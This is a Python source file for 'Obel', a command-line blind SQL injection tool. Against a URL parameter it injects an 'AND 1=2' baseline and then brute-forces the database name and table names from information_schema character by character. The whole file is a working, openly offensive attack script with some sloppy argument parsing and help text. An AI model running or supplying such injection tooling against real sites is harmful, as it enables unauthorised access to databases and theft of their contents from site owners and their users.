#!/bin/python
 
from colorama import Fore, Back, Style
from enum import Enum
import requests
import sys
 
AllChars = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '_']

class Log(object):

        loadwheelnum = 0
        LoadWheelChars = ['◐', '◓', '◑', '◒']

        class MSG(Enum):
            LOG = 1
            WARNING = 2
            ERROR = 3

        @staticmethod
        def loadwheel():
                if Log.loadwheelnum+1 < len(Log.LoadWheelChars):
                        Log.loadwheelnum+=1
                else:
                        Log.loadwheelnum=0
                return Log.LoadWheelChars[Log.loadwheelnum]

        @staticmethod
        def log(type, str):
                if type == Log.MSG.LOG:
                        print(Fore.GREEN + "[LOG] " + Style.RESET_ALL + str)
                elif type == Log.MSG.WARNING:
                        print(Fore.YELLOW + "[WARNING] " + Style.RESET_ALL + str)
                elif type == Log.MSG.ERROR:
                        print(Fore.RED + "[ERROR] " + Style.RESET_ALL + str)
 
def Attack(link, para):
        Log.log(Log.MSG.LOG, "Targetting URL: " + link + ", with (vulerable) parameter: " + para)
        injectpos = link.index(para) + len(para)
 
 
        for x in range(injectpos, len(link)):
                if link[x] == '/' or link[x] == '\\':
                        injectpos = x
                        break
                elif x == len(link)-1:
                        injectpos = x+1
                        break
 
        # SHOULD FIRST TRY REFLECTED
        # ONLY WORKS FOR INTERGERS NOW
        Log.log(Log.MSG.LOG, "Attempting blind SQL injection...")
 
        # DEFAULT PAGE IN THIS CASE IS THE PAGE WHERE IT DOES NOT RUN THE QUERY BECAUSE OF A AND 1=2
        defaultpage = InjectPayload("AND 1=2", link, injectpos)
        # [CHAR] IS THE POSITION WHERE THE CHARACTER WILL BE TRIED AND [NUM] IS THE NUMBER OF THE CHAR
        if GetDATABASE:
                DATABASENAME = BlindCrack("AND SUBSTRING(DATABASE(),[NUM],1)='[CHAR]'", link, injectpos, defaultpage)
                Log.log(Log.MSG.LOG, "Retrieved DATABASE name: " + DATABASENAME)
        if GetTABLES:
                for i in range(1, 999999):
                        TABLENAME = BlindCrack(f"AND SUBSTRING((SELECT TABLE_NAME FROM information_schema.tables where TABLE_TYPE = 'BASE TABLE' LIMIT {i} OFFSET 1),[NUM],1)='[CHAR]'", link, injectpos, defaultpage)
                        Log.log(Log.MSG.LOG, "Retrieved TABLE name: " + TABLENAME)
 
 
def InjectPayload(payload, link, pos):
        injectstr = link[:pos] + " "+ payload + link[pos:]
        return requests.get(injectstr).text
 
def BlindCrack(payload, link, pos, defaultpage):
        finished = False
        RetrievedName = ""
        CurrentStringNum = 1 # index of current char in string
        CurrentCharNum = 0


        logadd = Fore.GREEN + "[LOG] " + Style.RESET_ALL + "Retrieving: "
        sys.stdout.write("\r{0}".format(logadd + RetrievedName))
        sys.stdout.flush()
        while not finished:
                newpage = InjectPayload(payload.replace("[NUM]", str(CurrentStringNum)).replace("[CHAR]", AllChars[CurrentCharNum]), link, pos)
                sys.stdout.write("\r{0}".format(logadd + RetrievedName + Log.loadwheel()))
                sys.stdout.flush()
                if newpage != defaultpage:
                        CurrentStringNum+=1
                        RetrievedName+=AllChars[CurrentCharNum]
                        sys.stdout.write("\r{0}".format(logadd + RetrievedName))
                        sys.stdout.flush()
                        CurrentCharNum = 0
                elif CurrentCharNum + 1< len(AllChars):
                        CurrentCharNum+=1
                else:
                        sys.stdout.write("\r{0}".format(logadd + RetrievedName))
                        sys.stdout.flush()
                        print("\n")
                        return RetrievedName
 
 
 
 
 
 
def Help():
        print(
"""                             Obel:
                        By Thomas de Bock. 

         Obel can currently only be used to (SQL) inject parameters contained in the site url")

                        tags:")
                        --help
                        -u (url)")
                        -p (parametername)")


        """)

print(
"""
           .' `'.__
          /      \\ `'"-,
    __..-/ .     |      \\
         ; :'     '.     |                  ::::::::  :::::::::  :::::::::: :::  
        | :.       \\     =\\               :+:    :+: :+:    :+: :+:        :+:   
        \\':.      /  ,-.__;.-;`          +:+    +:+ +:+    +:+ +:+        +:+    
          '--._   /-.7`._..-;`          +#+    +:+ +#++:++#+  +#++:++#   +#+  
              |`-'      \\  =|          +#+    +#+ +#+    +#+ +#+        +#+      
              ;         |  =/         #+#    #+# #+#    #+# #+#        #+#       
             /     /\\   | =|         ########  #########  ########## ########## 
                  | /   / =/
                 \\ `--' =/
                   `-...-`


                       --------------------------------------
             """)
 
 
commands = sys.argv[1:]
 
parname = ""
urlname = ""
GetDATABASE = False
GetTABLES = False
 
for x in range(0, len(commands)):
        cmnd = commands[x]
        if cmnd[0]=='-':
                x+=1
                if cmnd[1:] == "p":
                        parname = commands[x]
                elif cmnd[1:] == "u":
                        urlname = commands[x]
                elif cmnd[1:] == "-help":
                        Help()
                elif cmnd[1:] == "-D":
                        x-=1
                        GetDATABASE = True
                elif cmnd[1:] == "-T":
                        x-=1
                        GetTABLES = True



if urlname != "" and parname != "":
        Attack(urlname, parname)